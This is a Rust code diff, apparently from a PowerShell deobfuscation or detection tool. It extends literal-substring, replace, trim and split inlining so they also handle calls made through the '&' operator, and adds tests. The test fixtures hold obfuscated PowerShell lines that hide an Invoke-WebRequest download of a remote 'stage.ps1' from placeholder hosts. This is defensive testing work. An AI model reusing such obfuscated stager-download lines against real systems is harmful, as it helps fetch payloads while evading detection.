@@ -3649,14 +3649,12 @@ fn inline_ps_literal_substring_calls(
         };
         let call_start = search_from + rel;
         let end_name = call_start + name.len();
-        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
+        let Some((replace_start, mut pos)) =
+            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+        else {
             search_from = end_name;
             continue;
-        }
-
-        let mut pos = skip_ascii_ws(bytes, end_name);
+        };
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
@@ -3670,7 +3668,7 @@ fn inline_ps_literal_substring_calls(
                 binding.start_name,
                 binding.len_name,
             ) {
-                matches.push((call_start, call_end, replacement));
+                matches.push((replace_start, call_end, replacement));
                 search_from = call_end;
                 match_count += 1;
                 continue;
@@ -3734,7 +3732,7 @@ fn inline_ps_literal_substring_calls(
         }
 
         let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
-        matches.push((call_start, call_end, replacement));
+        matches.push((replace_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
     }
@@ -3744,6 +3742,31 @@ fn inline_ps_literal_substring_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn ps_literal_extractor_call_start_and_arg_pos(
+    bytes: &[u8],
+    call_start: usize,
+    end_name: usize,
+) -> Option<(usize, usize)> {
+    let prev = bytes.get(call_start.wrapping_sub(1)).copied();
+    let next = bytes.get(end_name).copied();
+    if call_start > 0 && matches!(prev, Some(b'\'' | b'"')) && next == prev {
+        let quote_start = call_start - 1;
+        let mut before_quote = quote_start;
+        while before_quote > 0 && bytes[before_quote - 1].is_ascii_whitespace() {
+            before_quote -= 1;
+        }
+        let amp = before_quote.checked_sub(1)?;
+        if bytes.get(amp) != Some(&b'&') || bytes.get(amp.wrapping_sub(1)) == Some(&b'&') {
+            return None;
+        }
+        return Some((amp, skip_ascii_ws(bytes, end_name + 1)));
+    }
+    if is_ident_byte(prev) || is_ident_byte(next) {
+        return None;
+    }
+    Some((call_start, skip_ascii_ws(bytes, end_name)))
 }
 
 #[derive(Clone, Copy)]
@@ -3812,14 +3835,12 @@ fn inline_ps_literal_replace_calls(
         };
         let call_start = search_from + rel;
         let end_name = call_start + name.len();
-        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
+        let Some((replace_start, mut pos)) =
+            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+        else {
             search_from = end_name;
             continue;
-        }
-
-        let mut pos = skip_ascii_ws(bytes, end_name);
+        };
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
@@ -3833,7 +3854,7 @@ fn inline_ps_literal_replace_calls(
                 binding.needle_name,
                 binding.repl_name,
             ) {
-                matches.push((call_start, call_end, replacement));
+                matches.push((replace_start, call_end, replacement));
                 search_from = call_end;
                 match_count += 1;
                 continue;
@@ -3888,7 +3909,7 @@ fn inline_ps_literal_replace_calls(
             continue;
         }
         let replacement = format!("'{}'", replaced.replace('\'', "''"));
-        matches.push((call_start, call_end, replacement));
+        matches.push((replace_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
     }
@@ -3966,14 +3987,12 @@ fn inline_ps_literal_trim_calls(
         };
         let call_start = search_from + rel;
         let end_name = call_start + name.len();
-        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
+        let Some((replace_start, mut pos)) =
+            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+        else {
             search_from = end_name;
             continue;
-        }
-
-        let mut pos = skip_ascii_ws(bytes, end_name);
+        };
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
@@ -3987,7 +4006,7 @@ fn inline_ps_literal_trim_calls(
                 chars_name,
                 kind,
             ) {
-                matches.push((call_start, call_end, replacement));
+                matches.push((replace_start, call_end, replacement));
                 search_from = call_end;
                 match_count += 1;
                 continue;
@@ -4058,7 +4077,7 @@ fn inline_ps_literal_trim_calls(
             }
             (call_end, format!("'{}'", trimmed.replace('\'', "''")))
         };
-        matches.push((call_start, call_end, replacement));
+        matches.push((replace_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
     }
@@ -4299,14 +4318,12 @@ fn inline_ps_literal_split_index_calls(
         };
         let call_start = search_from + rel;
         let end_name = call_start + name.len();
-        if is_ident_byte(bytes.get(call_start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
+        let Some((replace_start, mut pos)) =
+            ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+        else {
             search_from = end_name;
             continue;
-        }
-
-        let mut pos = skip_ascii_ws(bytes, end_name);
+        };
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
@@ -4320,7 +4337,7 @@ fn inline_ps_literal_split_index_calls(
                 binding.sep_name,
                 binding.index_name,
             ) {
-                matches.push((call_start, call_end, replacement));
+                matches.push((replace_start, call_end, replacement));
                 search_from = call_end;
                 match_count += 1;
                 continue;
@@ -4389,7 +4406,7 @@ fn inline_ps_literal_split_index_calls(
             continue;
         }
         let replacement = format!("'{}'", part.replace('\'', "''"));
-        matches.push((call_start, call_end, replacement));
+        matches.push((replace_start, call_end, replacement));
         search_from = call_end;
         match_count += 1;
     }
@@ -4493,14 +4510,12 @@ fn inline_ps_literal_calls(text: &str, name: &str) -> String {
     while let Some(rel) = lower[search_from..].find(&needle) {
         let start = search_from + rel;
         let end_name = start + name.len();
-        if is_ident_byte(bytes.get(start.wrapping_sub(1)).copied())
-            || is_ident_byte(bytes.get(end_name).copied())
-        {
+        let Some((replace_start, mut pos)) =
+            ps_literal_extractor_call_start_and_arg_pos(bytes, start, end_name)
+        else {
             search_from = end_name;
             continue;
-        }
-
-        let mut pos = skip_ascii_ws(bytes, end_name);
+        };
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
@@ -4522,7 +4537,7 @@ fn inline_ps_literal_calls(text: &str, name: &str) -> String {
             }
             call_end = after + 1;
         }
-        matches.push((start, call_end, value));
+        matches.push((replace_start, call_end, value));
         search_from = call_end;
     }
 
@@ -7227,6 +7242,40 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
             "trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_call_operator_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+& Clean '~~~Invoke-WebRequest -Uri https://ps-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-call-operator-trim-extractor.example/stage.ps1'"
+            ),
+            "call-operator trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_quoted_call_operator_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+& 'Clean' '~~~Invoke-WebRequest -Uri https://ps-quoted-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-quoted-call-operator-trim-extractor.example/stage.ps1'"
+            ),
+            "quoted call-operator trim extractor call was not rewritten:\n{out}"
         );
     }
 
